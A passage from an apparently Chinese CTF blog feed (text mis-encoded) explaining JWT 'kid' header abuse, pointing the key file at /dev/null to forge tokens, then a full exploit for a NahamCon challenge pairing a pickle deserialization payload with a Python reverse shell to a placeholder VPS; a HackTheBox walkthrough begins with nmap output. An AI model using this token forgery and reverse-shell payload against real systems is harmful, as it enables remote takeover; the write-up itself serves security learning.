æˆä»»æ„æ–‡ä»¶è¯»å–ï¼ˆä¸ä¸€å®šæœ‰å›æ˜¾ï¼‰</p><p>ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŒ‡å®škidä¸º2ï¼Œå³HS256çš„secretkeyä¸º2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="attr">"typ"</span> : <span class="string">"jwt"</span>,</span><br><span class="line">    <span class="attr">"kid"</span> : <span class="string">"2"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…æœ‰çš„æ—¶å€™å®ƒæ˜¯ä»æ–‡ä»¶è·å–çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure><p>å‡å¦‚æœ‰webåº”ç”¨æŠŠå¯†é’¥å›æ˜¾å‡ºæ¥ï¼ˆä¸å¤ªå¯èƒ½ï¼‰ï¼Œå³å¯è¯»å–æ–‡ä»¶ã€‚<br>åŒæ—¶è¿˜æœ‰ä¸€ç§æ€è·¯ã€‚ç”±äºå¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ï¼Œåªè¦æ‰¾åˆ°å¯æ§çš„keyã€‚æˆ‘ä»¬å°±èƒ½åšåˆ°ä¼ªé€ jwttokenã€‚</p><p>æ¯”å¦‚æŒ‡å®šé™æ€cssæ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶å†…å®¹ä¸€å®šæ˜¯å¯æ§çš„ï¼Œä¸”æ˜“äºä»ç½‘é¡µè·å–çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;css&#x2F;public.css&quot;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±NahamconCTFçš„Bâ€™omarr Styleæ¥åˆ†æä¸‹<br>è¿™é¢˜å› ä¸ºèŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚ä½†æ˜¯ä»ç„¶å­¦åˆ°äº†éå¸¸å¤šä¸œè¥¿ï¼Œæ‰€ä»¥ç‰¹åœ°å†™ä¸‹ã€‚èµ›åæˆ‘ä¹Ÿä¸€æ—¶å…´èµ·å†™äº†ç¯‡è‹±æ–‡wpæŠ•CTFTimeä¸Šäº†<a href="https://hackmd.io/@byc404/B1VBX8Qp8" target="_blank" rel="noopener">https://hackmd.io/@byc404/B1VBX8Qp8</a><br>ä¸‹é¢æˆ‘ç›¸å½“äºè¡¥ä¸€ä»½ä¸­æ–‡wp:</p><p>é¦–å…ˆæ˜¯é¢˜ç›®æ³¨å†Œï¼Œç™»å½•åçš„token<br><img src="/2020/06/24/Make-jwt-great-again/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡ç‚¹åŒæ ·åœ¨äºjwtçš„header</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;secret.txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»headerä¿¡æ¯ä¸­ã€‚æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºï¼Œjwtçš„keyæ˜¯ä»secret.txtè¿™ä¸ªæ–‡ä»¶ä¸­è·å–çš„ã€‚</p><p>ä½†æ˜¯éå¸¸å¥‡æ€ªçš„æ˜¯ï¼Œåœ¨æ²¡æœ‰keyçš„æƒ…å†µä¸‹,<code>jwt.io</code>è§£å‡ºæ¥çš„payloadå†…å®¹ä¸ºç©ºã€‚</p><p>è¿™é‡Œå¯èƒ½å°±éœ€è¦ä¸€ç‚¹çœ¼åŠ›äº†ï¼Œå› ä¸ºè‡ªå·±åšè¿‡å¥½å‡ é“pickleç›¸å…³çš„åºåˆ—åŒ–é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œä¸éš¾ç›´æ¥çœ‹å‡ºï¼Œjwtçš„payloadéƒ¨åˆ†è¢«æ›¿æ¢æˆäº†pickleç”Ÿæˆçš„åºåˆ—åŒ–base64å†…å®¹ã€‚æˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥å•ç‹¬æ‹¿å‡ºè¿™ä¸€æ®µå¥‡æ€ªçš„base64ç”¨xxdçœ‹<br><img src="/2020/06/24/Make-jwt-great-again/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>èƒ½å¤Ÿæ˜æ˜¾çœ‹åˆ°<code>c_mamin</code>,<code>username</code>ç­‰å­—æ ·ã€‚è¿™å°±æ˜¯å…¸å‹çš„python opcodeçš„å†…å®¹</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘æ˜ç¡®äº†é¢˜ç›®çš„è¦æ±‚ï¼šä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆtoken,åŒ…å«æˆ‘ä»¬æ¶æ„çš„pythonåºåˆ—åŒ–å†…å®¹ï¼Œè¿›è¡ŒRCEã€‚</p><p>ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šå‘ç°ï¼Œsecret.txtå†…å®¹æœªçŸ¥ï¼Œè€Œæƒ³è¦è·å–keyå¹¶æ²¡æœ‰å…¶ä»–é€”å¾„ã€‚é‚£ä¹ˆé¦–å…ˆæˆ‘å…ˆå°è¯•<code>None</code>ç®—æ³•è¯•è¯•å§ã€‚</p><p>å°è¯•åå‘ç°åªæ¥å—HS256.çœ‹æ¥é‡ç‚¹æ˜¯ï¼Œå¯»æ‰¾åˆ°ä¸€ä¸ªå¯æ§çš„keyã€‚</p><p>æ­¤å¤„çš„kidè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ä½œä¸ºå¯†é’¥ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€å¤§éš¾ç‚¹ã€‚å› ä¸ºæ­¤é¢˜æ˜¯pythonç¯å¢ƒï¼Œå…¶é™æ€æ–‡ä»¶åŸºæœ¬æ²¡æœ‰å¯æ§çš„ã€‚å®ƒçš„htmlæ ¼å¼æ˜¯å…¸å‹çš„ç›´æ¥ä»cdnè·å–cssçš„<br><img src="/2020/06/24/Make-jwt-great-again/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œhtmlæ–‡ä»¶è™½ç„¶æˆ‘ä»¬èƒ½ç›´æ¥è·å–ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿™å¤§æ¦‚ç‡æ˜¯flaskèµ·çš„webåº”ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°±ç®—èƒ½æŒ‡å®š<code>templates/index.html</code>ä½œä¸ºkeyï¼Œhtmlä¸­æ˜¯åŒ…å«æœ‰jinja2çš„æ¨¡æ¿è¯­å¥çš„ï¼Œè¿™ä¸€éƒ¨åˆ†ä»£ç æˆ‘ä»¬ä¹Ÿæ˜¯æ— æ³•æ§åˆ¶çš„ã€‚è¿™é‡Œæ”¾å‡ºæ‰’ä¸‹æ¥çš„html<br><img src="/2020/06/24/Make-jwt-great-again/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´ï¼Œé™æ€æ–‡ä»¶è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ã€‚çœ‹æ¥åªèƒ½å°è¯•ç³»ç»Ÿæ–‡ä»¶äº†ã€‚</p><p>ä½†è¿™é‡Œæˆ‘æƒ³å¤§éƒ¨åˆ†äººéƒ½æ²¡æƒ³è¿‡ï¼Œlinuxçš„ç³»ç»Ÿæ–‡ä»¶ä¸­æœ‰ä»€ä¹ˆæ˜¯å†…å®¹å¯æ§çš„ï¼Ÿè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ã€‚å¸¸è§å¦‚<code>/etc/passwd</code>ï¼Œ<code>/etc/hosts</code>ç­‰ç­‰éƒ½æ˜¯æ— æ³•é¢„æµ‹çš„ã€‚è€Œ<code>/proc/self</code>ç­‰ç­‰ä¹Ÿè®¸å­˜åœ¨ç©ºæ–‡ä»¶ä½†æ˜¯ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾ç¡®å®šã€‚æœ‰æ²¡æœ‰ä»€ä¹ˆå†…å®¹æ˜¯ç™¾åˆ†ä¹‹ç™¾èƒ½å¤Ÿç¡®å®šçš„å‘¢ï¼Ÿ</p><p>æœ‰ã€‚ç­”æ¡ˆå°±æ˜¯<code>/dev/null</code></p><p>æˆ‘ä»¬éƒ½çŸ¥é“linuxå°†åƒåœ¾å†…å®¹æ‰”è¿›<code>/dev/null</code>æ˜¯å¸¸è§æ“ä½œã€‚è€Œæˆ‘ä»¬é€šå¸¸æ˜¯<code>echo log &gt; /dev/null 2&gt;&amp;1</code>æ¥å®Œæˆä¸€æ¬¡æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ç›´æ¥æ“ä½œã€‚<code>/dev/null</code>èƒ½å¤Ÿä¸¢å¼ƒä¸€åˆ‡å†™å…¥å…¶ä¸­çš„æ•°æ®ã€‚è€Œè¯»å–å®ƒå°†ç«‹å³å¾—åˆ°ä¸€ä¸ªEOFã€‚</p><p>æ‰€ä»¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶kidè¯»å–<code>/dev/null</code>ä¸ºkey.æ­¤æ—¶æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç©ºå­—ç¬¦ä¸²ä½œä¸ºHS256çš„secretkeyå°±èƒ½å¾—åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„key.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"kid"</span>: <span class="string">"/dev/null"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;&#125;</span><br><span class="line">token=jwt.encode(payload,<span class="string">''</span>,algorithm=<span class="string">"HS256"</span>,headers=headers).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„è„šæœ¬ï¼Œæˆ‘å‘ç°æ›´æ¢cookieæ—¶å¾—åˆ°çš„æŠ¥é”™å›æ˜¾ä¸å†æ˜¯<code>Invalid Signature</code>ï¼Œè€Œæ˜¯<code>Invalid load key</code><br>è¿™å…¶å®æ˜¯ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œå› ä¸ºç»è¿‡æœç´¢åè¿™æ˜¯ä¸€ä¸ªpickleçš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»é€šè¿‡æ ¡éªŒäº†ï¼Œåªè¦å‰©ä¸‹çš„payloadéƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„picklebase64æ•°æ®å³å¯ã€‚</p><p>ç„¶è€Œä»”ç»†ä¸€æƒ³å‘ç°é—®é¢˜ä¸å¯¹ã€‚jwtä½œä¸º<code>json web token</code>ï¼Œæœ‰æ•ˆçš„ä¼ è¾“æ•°æ®éƒ½åº”è¯¥æ˜¯jsonæ•°æ®ã€‚ä½†è¿™é‡Œå±…ç„¶ç›´æ¥æŠŠpickleçš„opcodebase64åæ”¾åœ¨äº†payloadéƒ¨åˆ†ã€‚è¿™è®©å½“æ—¶çš„æˆ‘æ— æ³•ç†è§£ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼špayloadçš„åŸå§‹å†…å®¹åœ¨pythonä¸­ä¸æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡pyjwtåº“è¿›è¡Œå¯†æ–‡ç”Ÿæˆã€‚</p><p>äºæ˜¯æˆ‘å»æ‰¾èµ„æ–™ã€‚å‘ç°å…¶å®jwtçš„HS256ç­¾åæ˜¯hmac-sha256ç”Ÿæˆçš„ã€‚å…¶ä¸­keyæ˜¯jwtçš„secretkey.dataæ˜¯<code>base64(header).base64(payload)</code>æ•´ä½“</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„šæœ¬æ‰‹åŠ¨æ‹¼æ¥ã€‚<br>ä¸‹é¢ç›´æ¥ç»™å‡ºå®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPSIP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">data =(<span class="string">"eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."</span>+payload).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line">signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())</span><br><span class="line"><span class="comment">#print(signature)</span></span><br><span class="line">print(data.decode()+<span class="string">'.'</span>+signature.decode().rstrip(<span class="string">'='</span>))</span><br></pre></td></tr></table></figure><p>è§£é‡Šå‡ ç‚¹<br>1.payloadéƒ¨åˆ†pickleä¸cPickleéƒ½å¯ä»¥ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯python3ç¯å¢ƒï¼Œè¿˜æ˜¯å¾—ç”¨python3ç”Ÿæˆã€‚</p><p>2.æ³¨æ„æˆ‘ä½¿ç”¨äº†<code>base64.urlsafe_b64encode</code>è€Œä¸æ˜¯<code>base64encode</code>ã€‚è¿™ç‚¹ä¸Šé¢ä¹Ÿè®²è¿‡äº†ï¼Œjwtä¸­ä¸ä¼šå‡ºç°<code>/</code>å’Œ<code>=</code>è¿™æ ·çš„å­—ç¬¦çš„ã€‚æ¯”èµ›ä¸­æˆ‘å¹¶æ²¡æœ‰å»è¯¦ç»†æŸ¥è¯¢ï¼Œè€Œæ˜¯ç›´æ¥æ‰‹åŠ¨å°†<code>/</code>æ›¿æ¢æˆ<code>_</code>å¹¶å»æ‰<code>=</code>åŒæ ·å¾—åˆ°äº†æœ‰æ•ˆçš„key.</p><p>3.è¿™é‡Œç”Ÿæˆpickleçš„payloadæˆ‘ä¹ŸåŒæ ·åšäº†ç‚¹æ‰‹è„šï¼šåœ¨å¼¹shellçš„ä»£ç ååŠ äº†å‡ ä¸ªç©ºæ ¼ã€‚åŸå› åŒä¸Šï¼Œå› ä¸ºpayloadéƒ¨åˆ†åŒæ ·ä¸å…è®¸<code>=</code>è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥å¯ä»¥æ‰‹åŠ¨åŠ ç©ºæ ¼é˜²æ­¢å‡ºç°<code>=</code>.</p><p>4.å¼¹shellåªå¯èƒ½ä½¿ç”¨pythonæˆ–bashåå¼¹shell.å› ä¸ºè¿™ä¸ªé¶æœºçœŸçš„å•¥éƒ½æ²¡æœ‰ï¼ˆcurl,wget,ncï¼‰ã€‚å½“ç„¶å¦‚æœæ¸—é€linuxé¶æœºåšå¤šäº†ä¹Ÿèƒ½å‘ç°pythonå¼¹shellçœŸçš„ä¸‡é‡‘æ²¹ã€‚æ²¡æœ‰ç”¨bashçº¯ç²¹æ˜¯å› ä¸ºæå¿˜äº†:(</p><p>5.æœ€åwpæ”¾å‡ºæ¥åæœ‰ç½‘å‹è¯´ç›´æ¥ç…§æ¬æˆ‘çš„expæœåŠ¡ç«¯ä¼šæŠ¥é”™<code>module &#39;nt&#39; not found</code>ã€‚æˆ‘è¯•äº†ä¸‹å‘ç°å±…ç„¶çœŸçš„æœ‰è¿™ä¸ªé—®é¢˜ã€‚ä½†æ˜¯æ¯”èµ›æ—¶æˆ‘æ˜¯ç”¨vpsä¸Šçš„python3.5ç”Ÿæˆçš„payload,ç»æµ‹è¯•è¿˜æ˜¯å¯ä»¥æˆåŠŸRCEã€‚è€Œæ¢åˆ°æœ¬æœºä¸Šçš„python3.7å°±å‡ºé”™äº†ã€‚æœ€åå¯¹æ¯”payloadå‘ç°ä¸¤è€…ç”Ÿæˆçš„ç­¾åä¸ä¸€è‡´ï¼Œè¿™é‡Œæˆ‘åªèƒ½æ¨æ–­æ˜¯åŠ å¯†ç®—æ³•çš„é—®é¢˜ã€‚æ¯•ç«Ÿæœ¬æœºä¸Šçš„pycryptoæˆ‘ä¸€ç›´æ²¡å¼„å¥½è¿‡ã€‚</p><p>æœ€åæˆåŠŸå¼¹shell.<br><img src="/2020/06/24/Make-jwt-great-again/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>jwtå®‰å…¨çš„ç›¸å…³æ¼æ´æˆ‘è®¤ä¸ºåŸºæœ¬ä¸Šå°±åªæœ‰ä»¥ä¸Šè¿™äº›äº†ã€‚å› ä¸ºå…¶å®å…¶ä»–ç›¸å…³çš„æ´æˆ–å¤šæˆ–å°‘éƒ½ä¸æ­¤ç›¸å…³ã€‚åªè¦æŒæ¡äº†è¿™äº›å¸¸è§å¯åˆ©ç”¨çš„ç‚¹ï¼Œå¹¶ä¸”äº†è§£ä¸€ä¸‹ç®—æ³•çš„æµç¨‹ï¼Œå³ä½¿ç¢°åˆ°æœ€åä¸€é“é¢˜è¿™ç§å˜é€šæ€§æå¼ºçš„ä¹Ÿèƒ½é¡ºç€æ€è·¯èµ°ä¸‹å»</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Quick-ä¸€æ¬¡è‰°éš¾çš„æ¸—é€</title>
      <link href="2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/"/>
      <url>2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºç°åœ¨è¿˜æ²¡æœ‰æ¥åˆ°ç¡®åˆ‡é€šçŸ¥è¯´æ˜¯å¦è€ƒè¯•,åŸæœ¬æœŸæœ«å¤ä¹ çš„è®¡åˆ’ä¹Ÿè¢«æ‰“ä¹±äº†ã€‚æ—¢ç„¶ç°åœ¨å¤ä¹ è§‰å¾—æœ‰ç‚¹äºï¼Œäºæ˜¯å¹²è„†å»åšåšhacktheboxçš„é¶æœºç®—äº†ï¼Œæ­£å¥½å¥½ä¹…æ²¡å†™wpäº†2333ã€‚</p><p>è™½ç„¶æ²¡æ›´æ–°æ–‡ç« ï¼Œä½†æ˜¯å…¶å®è‡ªå·±æ¯å‘¨éƒ½åœ¨è·Ÿç€ippsecçš„è§†é¢‘åšé€€å½¹é¶æœºã€‚å½“ç„¶å…¶å®ä¹Ÿåšäº†5.6å°ç°å½¹çš„ã€‚ä¸è¿‡ä»Šå¤©è¦å†™çš„Quické¶æœºçš„wpæ˜¯è‡ªå·±å¤´ä¸€æ¬¡ç‹¬ç«‹å®Œæˆçš„å›°éš¾éš¾åº¦çš„é¶æœºã€‚çœŸçš„çœŸçš„å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å½•ä¸‹ã€‚</p><p>å¦å¤–ç”±äºQuickè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚</p><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><ul><li>é¶æœºip: 10.10.10.186</li><li>æ”»å‡»æœº: 10.10.14.40</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>è¿™ä¸€éƒ¨åˆ†çœŸçš„æŒºéº»çƒ¦çš„â€¦â€¦ä¸­é—´æœ‰ç‚¹ç‚¹è„‘æ´çš„æˆåˆ†,ä½†æ€»ä½“è¿˜æ˜¯æ¯”è¾ƒç¬¦åˆçœŸå®ç¯å¢ƒçš„ã€‚</p><p>é¦–å…ˆå¿…ç„¶æ˜¯nmapç«¯å£æ‰«æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Jun 18 14:43:20 2020 as: nmap -sC -sV -oA nmap/quick 10.10.10.186</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.186</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)</span><br><span class="line">|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)</span><br><span class="line">|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)</span><br><span class="line">9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Quick | Broadband Services</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Jun 18 14:46:54 2020 -- 1 IP address (1 host up) scanned in 214.65 seconds</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†sshè·Ÿ9001webç«¯å£ã€‚å°è¯•è®¿é—®webé¡µé¢<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¼šå‘ç°ä¸»è¦ä¿¡æ¯æœ‰</p><ul><li>å‡ ä¸ªæ ‡å‡ºäº†å§“åè·Ÿå…¬å¸çš„ç•™è¨€</li><li>updateå¤„æŒ‡å‘äº†ä¸€ä¸ªç½‘é¡µ<code>https://portal.quick.htb</code></li></ul><p>åŒæ—¶åº•éƒ¨clientså®šå‘åˆ°clients.php<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 